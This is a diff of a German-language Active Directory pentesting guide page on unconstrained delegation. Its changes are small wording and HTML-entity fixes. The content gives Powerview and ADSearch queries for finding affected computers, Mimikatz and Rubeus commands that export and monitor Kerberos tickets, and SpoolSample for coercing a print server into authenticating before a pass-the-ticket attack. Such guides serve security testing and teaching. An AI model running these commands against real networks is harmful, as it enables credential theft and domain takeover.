@@ -14,14 +14,14 @@ Sie können **Computerobjekte mit diesem Attribut finden**, indem Sie überprüf
 ## Powerview
 Get-NetComputer -Unconstrained #DCs erscheinen immer, sind aber für Privesc nicht nützlich
 <strong>## ADSearch
-</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
+</strong>ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
 <strong># Export tickets with Mimikatz
 </strong>privilege::debug
 sekurlsa::tickets /export #Empfohlene Methode
 kerberos::list /export #Eine andere Methode
 
 # Monitor logins and export new tickets
-.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Alle 10s nach neuen TGTs suchen</code></pre>
+.\Rubeus.exe monitor /targetuser:<username> /interval:10 #Überprüfen Sie alle 10s auf neue TGTs</code></pre>
 
 Laden Sie das Ticket des Administrators (oder des Opferbenutzers) im Speicher mit **Mimikatz** oder **Rubeus für ein** [**Pass the Ticket**](pass-the-ticket.md)**.**\
 Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
@@ -29,10 +29,10 @@ Weitere Informationen: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/
 
 ### **Force Authentication**
 
-Wenn ein Angreifer in der Lage ist, einen Computer, der für "Unconstrained Delegation" zugelassen ist, zu **kompromittieren**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch** gegen ihn **anzumelden und ein TGT** im Speicher des Servers zu speichern.\
+Wenn ein Angreifer in der Lage ist, einen Computer, der für "Unconstrained Delegation" zugelassen ist, zu **kompromittieren**, könnte er einen **Druckserver** **täuschen**, um sich **automatisch** bei ihm anzumelden und ein **TGT** im Speicher des Servers zu speichern.\
 Dann könnte der Angreifer einen **Pass the Ticket-Angriff durchführen, um** das Benutzerkonto des Druckserver-Computers zu impersonieren.
 
-Um einen Druckserver dazu zu bringen, sich gegen eine beliebige Maschine anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
+Um einen Druckserver dazu zu bringen, sich bei einer beliebigen Maschine anzumelden, können Sie [**SpoolSample**](https://github.com/leechristensen/SpoolSample) verwenden:
 ```bash
 .\SpoolSample.exe <printmachine> <unconstrinedmachine>
 ```
